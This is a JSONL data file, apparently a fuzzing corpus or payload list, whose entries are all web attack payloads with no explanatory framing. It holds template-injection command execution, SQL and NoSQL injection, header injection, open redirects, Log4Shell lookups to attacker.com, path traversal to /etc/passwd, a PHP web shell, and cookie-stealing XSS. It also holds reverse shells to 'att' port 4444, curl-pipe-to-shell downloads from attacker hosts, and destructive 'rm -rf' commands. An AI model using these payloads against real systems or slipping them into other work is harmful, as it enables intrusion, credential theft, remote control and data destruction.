+{"ts": "2025-11-29T14:59:15.306882", "text": "{{- system('whoami') -}}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.345194", "text": "$(python -c \"import os;print(os.listdir('/'))\")", "meta": {}}
+{"ts": "2025-11-29T14:59:15.387073", "text": "{% set x = joiner %}{{ x.__init__.__globals__['os'].popen('id').read() }}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.410425", "text": "{\"$ne\": null}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.450849", "text": "{\"username\": {\"$gt\": \"\"}}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.487612", "text": "{\"$where\": \"function() { return this.password == 'a' }\"}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.528907", "text": "{\"username\": {\"$regex\": \".*\"}}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.557190", "text": "{\"username\": {\"$in\": [\"admin\"]}}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.594070", "text": "{\"$or\":[{\"username\":\"admin\"},{\"username\":{\"$ne\":null}}]}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.630998", "text": "{\"username\":{\"$exists\":true}}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.664140", "text": "{\"$regex\":\".*\"}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.698799", "text": "[\"__proto__\", {\"polluted\":true}]", "meta": {}}
+{"ts": "2025-11-29T14:59:15.724558", "text": "__proto__%00={\"admin\":true}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.748331", "text": "{'$gt':''}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.771485", "text": "{\"$regex\":\"^admin\"}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.793660", "text": "{\"$gt\":\"\"} || 1==1", "meta": {}}
+{"ts": "2025-11-29T14:59:15.814868", "text": "{ \"$ne\": \"\" }", "meta": {}}
+{"ts": "2025-11-29T14:59:15.840047", "text": "{'$nin': ['a']}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.865425", "text": "{$slice: -1}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.896646", "text": "{\"username\":{\"$regex\":\"^.*$\",\"$options\":\"i\"}}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.931386", "text": "{\"$where\":\"sleep(5000)\"}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.984510", "text": "admin' || 1==1", "meta": {}}
+{"ts": "2025-11-29T14:59:16.013104", "text": "'$ne': ''", "meta": {}}
+{"ts": "2025-11-29T14:59:16.040315", "text": "\r\nSet-Cookie: hacked=1", "meta": {}}
+{"ts": "2025-11-29T14:59:16.071972", "text": "%0d%0aSet-Cookie:%20hacked=1", "meta": {}}
+{"ts": "2025-11-29T14:59:16.100225", "text": "\nContent-Length: 0\n\nGET / HTTP/1.1", "meta": {}}
+{"ts": "2025-11-29T14:59:16.122024", "text": "\r\n\r\n<script>alert(1)</script>", "meta": {}}
+{"ts": "2025-11-29T14:59:16.146953", "text": "https://example.com/redirect?next=http://evil.com", "meta": {}}
+{"ts": "2025-11-29T14:59:16.168579", "text": "https://example.com?url=//evil.com", "meta": {}}
+{"ts": "2025-11-29T14:59:16.195776", "text": "https://example.com?return=%2F%2Fevil.com", "meta": {}}
+{"ts": "2025-11-29T14:59:16.216616", "text": "/\nSet-Cookie: name=1", "meta": {}}
+{"ts": "2025-11-29T14:59:16.243119", "text": "http://example.com%0d%0aSet-Cookie:foo=bar", "meta": {}}
+{"ts": "2025-11-29T14:59:16.275116", "text": "http://example.com/%0d%0aContent-Length:0%0d%0a%0d%0a", "meta": {}}
+{"ts": "2025-11-29T14:59:16.297979", "text": "https://example.com?next=//attacker.com", "meta": {}}
+{"ts": "2025-11-29T14:59:16.316858", "text": "//attacker.com", "meta": {}}
+{"ts": "2025-11-29T14:59:16.337684", "text": "/\r\nLocation: http://evil/", "meta": {}}
+{"ts": "2025-11-29T14:59:16.356325", "text": "\r\nX-Injected: value", "meta": {}}
+{"ts": "2025-11-29T14:59:16.383007", "text": "%0d%0atest:1", "meta": {}}
+{"ts": "2025-11-29T14:59:16.411273", "text": "https://example.com/?redirect=https://evil.com%2f%2f", "meta": {}}
+{"ts": "2025-11-29T14:59:16.441186", "text": "/%0d%0aSet-Cookie:session=evil", "meta": {}}
+{"ts": "2025-11-29T14:59:16.488264", "text": "https://example.com/?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=", "meta": {}}
+{"ts": "2025-11-29T14:59:16.519845", "text": "https://example.com?next=%2f%5c%5cattacker.com", "meta": {}}
+{"ts": "2025-11-29T14:59:16.545815", "text": "https://example.com/?redir=javascript:alert(1)", "meta": {}}
+{"ts": "2025-11-29T14:59:16.569618", "text": "${jndi:ldap://attacker.com/a}", "meta": {}}
+{"ts": "2025-11-29T14:59:16.591999", "text": "${jndi:rmi://attacker.com/b}", "meta": {}}
+{"ts": "2025-11-29T14:59:16.614334", "text": "${jndi:iiop://attacker.com/c}", "meta": {}}
+{"ts": "2025-11-29T14:59:16.635132", "text": "#{jndi:ldap://attacker.com/a}", "meta": {}}
+{"ts": "2025-11-29T14:59:16.658037", "text": "AA' OR '1'='1'--", "meta": {}}
+{"ts": "2025-11-29T14:59:16.678379", "text": "A\" OR \"1\"=\"1\"--", "meta": {}}
+{"ts": "2025-11-29T14:59:16.699711", "text": "%c0%af..%c0%afetc/passwd", "meta": {}}
+{"ts": "2025-11-29T14:59:16.727541", "text": "3120f09d92aaf09d91852031efbc9d31", "meta": {}}
+{"ts": "2025-11-29T14:59:16.752883", "text": "MSDwnZKq8J2RhSAx77ydMQ==", "meta": {}}
+{"ts": "2025-11-29T14:59:16.786528", "text": "OhZRO2K6kkWLKDsFg75NPqW8rdeUnBYtj0Kx8CYr5...", "meta": {}}
+{"ts": "2025-11-29T14:59:16.814935", "text": "username=amF2YXNjcmlwdDpldmFsKGF0b2IoJ1k...", "meta": {}}
+{"ts": "2025-11-29T14:59:16.852452", "text": "<?php system($_GET['cmd']); ?>", "meta": {}}
+{"ts": "2025-11-29T14:59:16.880430", "text": "<% =File.open('/etc/passwd').read %>", "meta": {}}
+{"ts": "2025-11-29T14:59:16.908638", "text": "<%= system('ls') %>", "meta": {}}
+{"ts": "2025-11-29T14:59:16.931342", "text": "__import__('os').system('id')", "meta": {}}
+{"ts": "2025-11-29T14:59:16.961136", "text": "O:8:\"MongoId\":1:{s:2:\"$id\";s:24:\"...\";}", "meta": {}}
+{"ts": "2025-11-29T14:59:16.991900", "text": "rO0ABXNyABFqYXZhLnV0aWwuQXJyYXlMaXN0", "meta": {}}
+{"ts": "2025-11-29T14:59:17.017558", "text": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "meta": {}}
+{"ts": "2025-11-29T14:59:17.048985", "text": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % x SYSTEM \"http://evil/x\"> %x; ]>", "meta": {}}
+{"ts": "2025-11-29T14:59:17.078246", "text": "{\"alg\":\"HS256\",\"typ\":\"JWT\"} . { \"sub\":\"1\" } . signature", "meta": {}}
+{"ts": "2025-11-29T14:59:17.108672", "text": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", "meta": {}}
+{"ts": "2025-11-29T14:59:17.135737", "text": "data:;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=", "meta": {}}
+{"ts": "2025-11-29T14:59:17.155341", "text": "<% print 'hacked' %>", "meta": {}}
+{"ts": "2025-11-29T14:59:17.175631", "text": "{{ dump(app) }}", "meta": {}}
+{"ts": "2025-11-29T14:59:17.194354", "text": "${7*7}", "meta": {}}
+{"ts": "2025-11-29T14:59:17.218129", "text": "${@print(md5(1))}", "meta": {}}
+{"ts": "2025-11-29T14:59:17.248120", "text": "'; exec('/usr/bin/perl -e \"use Socket;...\"') --", "meta": {}}
+{"ts": "2025-11-29T14:59:17.271029", "text": "\\u202Eevil.com", "meta": {}}
+{"ts": "2025-11-29T14:59:17.297645", "text": "%E2%80%AEevil.com", "meta": {}}
+{"ts": "2025-11-29T14:59:17.341746", "text": "'%00' OR '1'='1'", "meta": {}}
+{"ts": "2025-11-29T14:59:17.380713", "text": "\\x00\\x00\\x00", "meta": {}}
+{"ts": "2025-11-29T14:59:17.416894", "text": "..%c0%af..%c0%af/etc/passwd", "meta": {}}
+{"ts": "2025-11-29T14:59:17.453274", "text": "<img src=1 onerror=\"this.src='//attacker/?c='+document.cookie\">", "meta": {}}
+{"ts": "2025-11-29T14:59:17.485161", "text": "$(printf 'bash -i >& /dev/tcp/att/4444 0>&1')", "meta": {}}
+{"ts": "2025-11-29T14:59:17.511986", "text": "import os; os.system('uname -a')", "meta": {}}
+{"ts": "2025-11-29T14:59:17.539638", "text": "'; db.shutdownServer(); //", "meta": {}}
+{"ts": "2025-11-29T14:59:17.563793", "text": "'; process.exit(); //", "meta": {}}
+{"ts": "2025-11-29T14:59:17.586743", "text": "-exec 'rm -rf /'", "meta": {}}
+{"ts": "2025-11-29T14:59:17.614826", "text": "'\"|python -c \"import os;os.system('id')\"", "meta": {}}
+{"ts": "2025-11-29T14:59:17.641607", "text": "'; socket.connect(\"attacker\",4444) //", "meta": {}}
+{"ts": "2025-11-29T14:59:17.673709", "text": "eval(String.fromCharCode(97,108,101,114,116,40,49,41))", "meta": {}}
+{"ts": "2025-11-29T14:59:17.697491", "text": "system(\"cat /etc/passwd\")", "meta": {}}
+{"ts": "2025-11-29T14:59:17.725061", "text": "..%2f..%2f..%2fwindows\\\\system.ini", "meta": {}}
+{"ts": "2025-11-29T14:59:17.748769", "text": "'; echo 'pwned' > /tmp/pwned; --", "meta": {}}
+{"ts": "2025-11-29T14:59:17.768900", "text": "__proto__=1", "meta": {}}
+{"ts": "2025-11-29T14:59:17.795986", "text": "constructor.prototype.polluted = true", "meta": {}}
+{"ts": "2025-11-29T14:59:17.822982", "text": "<svg onload=alert(String.fromCharCode(88,83,83))></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:17.849161", "text": "{{ config.items() }}", "meta": {}}
+{"ts": "2025-11-29T14:59:17.874867", "text": "{\"__proto__\": {\"isAdmin\": true}}", "meta": {}}
+{"ts": "2025-11-29T14:59:17.900878", "text": "var a = new ActiveXObject(\"WScript.Shell\");a.Run(\"calc.exe\");", "meta": {}}
+{"ts": "2025-11-29T14:59:17.926865", "text": "${{jndi:ldap://127.0.0.1:1389/Exploit}}", "meta": {}}
+{"ts": "2025-11-29T14:59:17.947619", "text": "${jndi:ldap://localhost/a}", "meta": {}}
+{"ts": "2025-11-29T14:59:17.970595", "text": "~~!@#$%^&*()_+{}|:\"<>?", "meta": {}}
+{"ts": "2025-11-29T14:59:18.010447", "text": "..//..//..//etc/passwd", "meta": {}}
+{"ts": "2025-11-29T14:59:18.085231", "text": "\\..\\..\\..\\windows\\system.ini", "meta": {}}
+{"ts": "2025-11-29T14:59:18.124142", "text": "\\x2fetc\\x2fpasswd", "meta": {}}
+{"ts": "2025-11-29T14:59:18.153373", "text": "eval(atob('YWxlcnQoMSk='))", "meta": {}}
+{"ts": "2025-11-29T14:59:18.178179", "text": "%3Csvg%20onload%3Dalert(1)%3E", "meta": {}}
+{"ts": "2025-11-29T14:59:18.206840", "text": "echo YmFzaCAtaSA+JiAvZGV2L3RjcC9ldmlsLnBvcnQ= | base64 -d | sh", "meta": {}}
+{"ts": "2025-11-29T14:59:18.240952", "text": "; powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('att',4444);...\"", "meta": {}}
+{"ts": "2025-11-29T14:59:18.263724", "text": "$(curl -sSL http://attacker/p | bash)", "meta": {}}
+{"ts": "2025-11-29T14:59:18.287880", "text": "{\"$regex\":\"^[\\\\s\\\\S]*$\"}", "meta": {}}
+{"ts": "2025-11-29T14:59:18.315267", "text": "';system('ls') && echo", "meta": {}}
+{"ts": "2025-11-29T14:59:18.352277", "text": "../../../../../../../../../../etc/passwd", "meta": {}}
+{"ts": "2025-11-29T14:59:18.383693", "text": "../../../proc/self/cwd/../../etc/passwd", "meta": {}}
+{"ts": "2025-11-29T14:59:18.415379", "text": "' OR exists(select * from information_schema.tables) --", "meta": {}}
+{"ts": "2025-11-29T14:59:18.446933", "text": "<!--#exec cmd=\"/bin/ls\" -->", "meta": {}}
+{"ts": "2025-11-29T14:59:18.478885", "text": "'; db.runCommand({eval: 'sleep(10000)'})", "meta": {}}
+{"ts": "2025-11-29T14:59:18.502471", "text": "\\$(sleep 5)``", "meta": {}}
+{"ts": "2025-11-29T14:59:18.528324", "text": ")\"||alert(1);//", "meta": {}}
+{"ts": "2025-11-29T14:59:18.552233", "text": "\\n<script>alert(1)</script>", "meta": {}}
+{"ts": "2025-11-29T14:59:18.588947", "text": "{{ ''.__class__.__mro__[2].__subclasses__()[40]('ls',shell=True,stdout=-1).communicate() }}", "meta": {}}
+{"ts": "2025-11-29T14:59:18.616066", "text": "payload_b64:PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=", "meta": {}}
+{"ts": "2025-11-29T14:59:18.646066", "text": "http://127.0.0.1:80/%0aContent-Length:0%0a%0aGET / HTTP/1.1", "meta": {}}
+{"ts": "2025-11-29T14:59:18.673895", "text": "data:application/x-sql;charset=utf-8,SELECT%20*%20FROM%20users", "meta": {}}
+{"ts": "2025-11-29T14:59:18.698414", "text": "$(perl -e 'print \"X\"x1000000')", "meta": {}}
+{"ts": "2025-11-29T14:59:18.718993", "text": "\\u0000../etc/passwd", "meta": {}}
+{"ts": "2025-11-29T14:59:18.739659", "text": "..%252f..%252fetc%252fpasswd", "meta": {}}
+{"ts": "2025-11-29T14:59:18.761892", "text": "{{request.cookies.__class__}}", "meta": {}}
+{"ts": "2025-11-29T14:59:18.783411", "text": "';throw new Error('x')//", "meta": {}}
+{"ts": "2025-11-29T14:59:18.806505", "text": "'; ALTER USER postgres WITH PASSWORD 'p'; --", "meta": {}}
+{"ts": "2025-11-29T14:59:18.829077", "text": "<?php phpinfo(); ?>", "meta": {}}
+{"ts": "2025-11-29T14:59:18.859175", "text": "'; REVOKE ALL PRIVILEGES ON DATABASE mydb FROM public; --", "meta": {}}
+{"ts": "2025-11-29T14:59:18.880731", "text": "^<script>alert(1)</script>", "meta": {}}
+{"ts": "2025-11-29T14:59:18.910380", "text": "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E", "meta": {}}
+{"ts": "2025-11-29T14:59:18.941719", "text": "'; exec('curl http://att/p -o /tmp/p; sh /tmp/p') --", "meta": {}}
+{"ts": "2025-11-29T14:59:18.979097", "text": "';CREATE OR REPLACE FUNCTION hack() RETURNS void AS $$ BEGIN EXECUTE 'rm -rf /tmp/*'; END; $$ LANGUAGE plpgsql;", "meta": {}}
+{"ts": "2025-11-29T14:59:19.009125", "text": "| curl -s http://att/p | sh", "meta": {}}
+{"ts": "2025-11-29T14:59:19.066477", "text": "0x3C737363726970743E616C6572742831293C2F737363726970743E", "meta": {}}
+{"ts": "2025-11-29T14:59:19.102647", "text": "/*<!--*/<script>alert(1)</script>/*-->*/", "meta": {}}
+{"ts": "2025-11-29T14:59:19.136692", "text": "'}__proto__={'polluted':true}//", "meta": {}}
+{"ts": "2025-11-29T14:59:19.176558", "text": "<img src=\"x\" onerror=\"new Image().src='//att?r='+document.cookie\">", "meta": {}}
+{"ts": "2025-11-29T14:59:19.213711", "text": "eval(decodeURIComponent('%61%6c%65%72%74%281%29'))", "meta": {}}
+{"ts": "2025-11-29T14:59:19.237556", "text": "';WAITFOR DELAY '00:00:10'--", "meta": {}}
+{"ts": "2025-11-29T14:59:19.267375", "text": "'; xp_cmdshell('net user attacker /add') --", "meta": {}}
+{"ts": "2025-11-29T14:59:19.299108", "text": "'; DROP INDEX users_idx; --", "meta": {}}
+{"ts": "2025-11-29T14:59:19.334997", "text": "'; LOCK TABLE users IN ACCESS EXCLUSIVE MODE; --", "meta": {}}
+{"ts": "2025-11-29T14:59:19.371997", "text": "; dd if=/dev/zero of=/tmp/payload bs=1M count=100", "meta": {}}
+{"ts": "2025-11-29T14:59:19.406853", "text": "); exec('ls') //", "meta": {}}
+{"ts": "2025-11-29T14:59:19.445032", "text": "$(perl -e 'alarm shift; exec @ARGV' 10 /bin/sh -i)", "meta": {}}
+{"ts": "2025-11-29T14:59:19.488263", "text": "'; COPY (SELECT '') TO PROGRAM 'sh -c \"curl http://att/p | sh\"'; --", "meta": {}}
+{"ts": "2025-11-29T14:59:19.531788", "text": "$(python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"att\",4444));os.dup2(s.fileno(),0);...')", "meta": {}}
